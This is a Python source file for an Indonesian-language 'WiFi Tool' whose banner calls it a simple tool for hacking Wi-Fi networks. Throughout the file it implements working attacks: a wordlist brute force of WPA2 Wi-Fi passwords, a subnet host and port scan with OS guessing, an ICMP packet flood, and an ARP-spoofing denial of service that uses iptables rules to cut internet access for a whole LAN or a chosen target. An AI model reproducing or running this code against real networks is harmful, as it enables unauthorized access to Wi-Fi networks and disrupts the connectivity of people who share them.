import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
from scapy.all import *
from mac_vendor_lookup import MacLookup, VendorNotFoundError
import time, argparse, os, pyfiglet, socket, struct, random, platform, subprocess, re
from termcolor import colored
from colorama import Fore, Style, init

def cracking(ssid, wordlist):
        print("[+]Cracking password Wi-fi ssid: ", ssid ,", silahkan tunggu...")
        word = open(wordlist, "r")
  
        for passw in word:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            passw=passw.strip()
            print("Mencoba password:",passw)
            profile.key = passw
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.remove_all_network_profiles()
            profile = iface.add_network_profile(profile)

            iface.connect(profile)
            time.sleep(4)
            if iface.status() == const.IFACE_CONNECTED:
                print(passw)
                print('[✅]PASSWORD ditemukan! SSID:' ,ssid,'PASSWORD:',passw)
                break
        else:
            print("Password tidak di list")
            
def scan_wifi():
    print("[+]Men-scan jaringan Wi-Fi Tersedia")
    print("[+]Tunggu sebentar...")
    
    wifi = PyWiFi()  
    iface = wifi.interfaces()[0]  
    
    iface.scan()  
    time.sleep(5)  
    
    results = iface.scan_results()

    available_devices = []

    for network in results:
        ssid = network.ssid
        if ssid not in available_devices:
            available_devices.append(ssid)

    print("Available devices:")

    for ssid in available_devices:
        print(ssid)

def check_mac(ip):
    result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
    output = result.stdout
    mac_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
    match = re.search(mac_pattern, output)

    if match:
      return match.group(0)
    else:
      return "MAC Not Found"

def check_port(ip, port, PORT_SERVICES):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        
        if s.connect_ex((ip, port)) == 0:
            service = PORT_SERVICES.get(port, "Unknown")
            print(f"Port {port} terbuka - {service}")

    return "Unknown"
            
def check_os(ttl):
    OS_TTL_DATABASE = {
        (0, 64): "Linux/Unix",
        (65, 128): "Windows",
        (129, 255): "Cisco/Network Device",
        (256, 1000): "Solaris/AIX"
    }

    for (min_ttl, max_ttl), os_name in OS_TTL_DATABASE.items():
        if min_ttl <= ttl <= max_ttl:
            return os_name
            
    return "Unknown OS"

def scan_ip(gateway):
    PORT_SERVICES = {
     21: "FTP - Open",
     22: "SSH - Open", 
     23: "Telnet - Open",
     25: "SMTP - Open",
     53: "DNS - Open",
     80: "HTTP - Open",
     110: "POP3 - Open",
     135: "RPC - Open",
     139: "NetBIOS - Open",
     143: "IMAP - Open",
     445: "SMB - Open",
     1433: "MSSQL - Open",
     1434: "MSSQL Browser - Open",
     3306: "MySQL - Open",
     3389: "RDP - Open",
     5900: "VNC - Open",
     6379: "Redis - Open",
     27017: "MongoDB - Open"
    }

    print(f"[+]Script berjalan di: {platform.system()}")
    
    for x in range(1, 255):
     try:
      if platform.system() == 'Linux':
       count = "1"
       ip = gateway + str(x)

       res = subprocess.run(["ping", "-c", count, "-W", count, ip], capture_output=True, text=True, timeout=10)
       output = res.stdout
      
       if res.returncode == 0:
        print(f"[+]IP Ditemukan: {ip}")
        ttl_match = re.search(r'ttl=(\d+)', output.lower())
        ttl = int(ttl_match.group(1)) if ttl_match else 64
        c = check_os(ttl)
        print(f"OS: {c}")
        ma = check_mac(ip)
        print(f"MAC Address: {ma}")

        for port in PORT_SERVICES.keys():
            check_port(ip, port, PORT_SERVICES)

        print()
     except subprocess.TimeoutExpired:
        print("e")
        pass

    print("[+]Selesai")

def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i] << 8) + data[i+1]
    if n:
        s += (data[-1] << 8)
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def create_icmp_header(id, seq, payload):
    icmp_type = 8  # Echo request
    code = 0
    chksum = 0

    id = id & 0xFFFF
    seq = seq & 0xFFFF

    header = struct.pack('!BBHHH', icmp_type, code, chksum, id, seq)
    chksum = checksum(header + payload)
    return struct.pack('!BBHHH', icmp_type, code, chksum, id, seq)

def icmp_attack(ip, loop, pay):
    if platform.system() == 'Linux':
       os.system('sudo sysctl -w net.ipv4.ping_group_range="0 2147483647"')
       
    payload_size = int(pay)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_ICMP)
    seq = 0
    
    for x in range(int(loop)):
      payload = os.urandom(payload_size)
      icmp_header = create_icmp_header(1234, seq, payload)
      packet = icmp_header + payload
      sock.sendto(packet, (ip, 1))
      seq = (seq + 1) & 0xFFFF 
      print("[+]Mengirim ICMP Paket, Loop:" ,x)
        
def split_ip(ip):
    return ip.rsplit('.', 1)[0] + "."

def change_ip(gateway):
    return gateway.rsplit('.', 1)[0] + ".0/24"

def enable_forwarding():
    print("[+] IP forwarding aktif.")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP forwarding mati.")

def block_internet(iface):
    os.system("iptables -P FORWARD DROP")
    os.system("iptables -P OUTPUT DROP")
    os.system(f"iptables -A FORWARD -o {iface} -j DROP")
    os.system(f"iptables -A OUTPUT -o {iface} -j DROP")
    os.system("iptables -A FORWARD -p udp --dport 53 -j DROP")
    os.system("iptables -A OUTPUT -p udp --dport 53 -j DROP")
    print("[+] Akses Internet diblokir.")

def block_internet_single(host):
    os.system(f"iptables -A FORWARD -s {host} -j DROP")
    print("[+] Akses Internet diblokir hanya satu target.")
    
def unblock_internet():
    os.system("iptables -F")
    os.system("iptables -X")
    os.system("iptables -P FORWARD ACCEPT")
    os.system("iptables -P OUTPUT ACCEPT")
    print("[+] Akses Internet dikembalikan.")

def unblock_internet_single():
    os.system("iptables -F")
    print("[+] Akses Internet dikembalikan.")
    
def scan_hosts(ip_range, iface, gateway_ip):
    print("[+] Men-scan IP yang tersedia...")
    ans, _ = arping(ip_range, iface=iface, timeout=2, verbose=False)
    hosts = [rcv.psrc for snd, rcv in ans if rcv.psrc != gateway_ip]
    print(f"[+] IP ditemukan: {hosts}")
    time.sleep(1.0)
    return hosts

def arp_spoof(host, gateway_ip, iface):
    target_mac = getmacbyip(host)
    attacker_mac = get_if_hwaddr(iface)
    gateway_mac = getmacbyip(gateway_ip)

    pkt_to_target = Ether(dst=target_mac) / ARP(op=2, pdst=host, hwdst=target_mac, 
                                                psrc=gateway_ip, hwsrc=attacker_mac)
    
    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
                                                  psrc=host, hwsrc=attacker_mac)
    print("ARP SPOOF ACTIVE")
    
    while True:
        try:
            sendp(pkt_to_target, iface=iface, verbose=False)
            sendp(pkt_to_gateway, iface=iface, verbose=False)
            time.sleep(1.5)
        except Exception:
            break

def arp_spoof_single(host, gateway_ip, iface):
    target_mac = getmacbyip(host)
    attacker_mac = get_if_hwaddr(iface)
    gateway_mac = getmacbyip(gateway_ip)

    pkt_to_target = Ether(dst=target_mac) / ARP(op=2, pdst=host, hwdst=target_mac, 
                                                psrc=gateway_ip, hwsrc=attacker_mac)
    
    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
                                                  psrc=host, hwsrc=attacker_mac)

    while True:
        try:
            sendp(pkt_to_target, iface=iface, verbose=False)
            sendp(pkt_to_gateway, iface=iface, verbose=False)
            time.sleep(1.5)
        except Exception:
            break
        
def broadcast_arp(pdst, iface, gateway_ip):
    mac = get_if_hwaddr(iface)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(op=2, pdst=pdst, psrc=gateway_ip, hwsrc=mac, hwdst="ff:ff:ff:ff:ff:ff")
    
    print(pdst)
    while True:
        sendp(ether / arp, iface=iface, count=3, verbose=False)
        time.sleep(3)
        
def start_spoofing(hosts, pdst, iface, gateway_ip):
    threads = []
    for host in hosts:
        t = threading.Thread(target=arp_spoof, args=(host, gateway_ip, iface,))
        t.start()
        threads.append(t)

    t_broadcast = threading.Thread(target=broadcast_arp, args=(pdst, iface, gateway_ip,))
    t_broadcast.daemon = True
    t_broadcast.start()
    threads.append(t_broadcast)

    return threads

def main():
 os.system('clear')
 ascii_art = pyfiglet.figlet_format("WiFi Tool")
 colored_art = colored(ascii_art, "cyan", attrs=["bold"])
 print(colored_art)
 print(Fore.RED + "--------------------------------------------------------------------------------------------------------")
 print()
 print(Fore.LIGHTGREEN_EX + "Sebuah tool simpel untuk melakukan hacking di jaringan wifi.")
 print(Fore.LIGHTGREEN_EX + "seperti Brute Force Password Wi-Fi, ICMP Flood, dan stop Internet.")
 print(Fore.LIGHTGREEN_EX + "tentang cara penggunaan ketik 'python run.py --help'.")
 print(Fore.LIGHTGREEN_EX + "dan tekan ctrl +c untuk menghentikan program apapun.")
 print(Fore.LIGHTGREEN_EX + "Versi: 1.0.0")
 print(Fore.LIGHTGREEN_EX + "Bahasa: Python")
 print(Fore.LIGHTGREEN_EX + "Github: https://github.com/Yogadwi-a/WifiLanhacktools.git")
 print()

 parser = argparse.ArgumentParser(description="Contoh perintah untuk menjalankan program")
 parser.add_argument('--loop', help='Loop untuk serangan ICMP Attack untuk melakukan perulangan')
 parser.add_argument('--ip', help='IP target untuk icmp attack untuk argumen IP (cara penggunaan: --ip 192.168.1.1)')
 parser.add_argument('--g', help='Gateway target untuk argumen scan_ip (cara penggunaan: --g 192.168.1.1/24), dan untuk gateway untuk argumen stop internet (cara penggunaan: --g 192.168.1.1)')
 parser.add_argument('--s', help='SSID target untuk Brute Force Password Wi-Fi')
 parser.add_argument('--w', help='Path file wordlist untuk Brute Force Password Wi-Fi')
 parser.add_argument('--i', help='Interface atau hardware penghubung untuk stop internet')
 parser.add_argument('--m', help='pilih mode untuk stop internet')
 parser.add_argument('--p', help='pdst untuk stop internet')
 parser.add_argument('--pay', help='untuk kirim payload')
 parser.add_argument("--c", choices=['scan_wifi_lists', 'crack_wifi_password', 'scan_ip', 'icmp_attack', 'dos_attack'], help="Aksi yang ingin dilakukan")
 args = parser.parse_args()

 if args.c == 'scan_wifi_lists':
  scan_wifi()
 elif args.c == 'crack_wifi_password':
  cracking(args.s, args.w)
 elif args.c == 'scan_ip':
  g = args.g
  gateway = g.rsplit('.', 1)[0] + "."
  print(f"[+] Scanning IP {gateway}")
  print("[+] Tekan ctrl + c untuk berhenti")
  time.sleep(1.0)
  scan_ip(gateway)
 elif args.c == 'icmp_attack':
  icmp_attack(args.ip, args.loop, args.pay)
 elif args.c == 'dos_attack':
  ip_range = change_ip(args.g)
  gateway_ip = args.g
  iface = args.i

  if args.m == 'all':
   pdst = args.p
   print("[+] Memulai DOS Attack pada 1 jaringan")
   time.sleep(1.0)
   enable_forwarding()
   time.sleep(1.0)
   hosts = scan_hosts(ip_range, iface, gateway_ip)
   block_internet(iface)
   print("[+] Serangan ARP Spoof aktif...")
   threads = start_spoofing(hosts, pdst, iface, gateway_ip)
  
   try:
     while True:
         time.sleep(1)
   except KeyboardInterrupt:
         print("\n[!] Stop...")
         unblock_internet()
         disable_forwarding()
         
  elif args.m == 'single':
   host = args.ip
   print("[+] Memulai DOS Attack pada target" ,host)
   time.sleep(1.0)
   enable_forwarding()
   block_internet_single(host)
   print("[+] Serangan ARP Spoof aktif..." ,host)
   arp_spoof_single(host, gateway_ip, iface)

   try:
     while True:
         time.sleep(1)
   except KeyboardInterrupt:
         print("\n[!] Stop...")
         unblock_internet_single()
         disable_forwarding()

main()
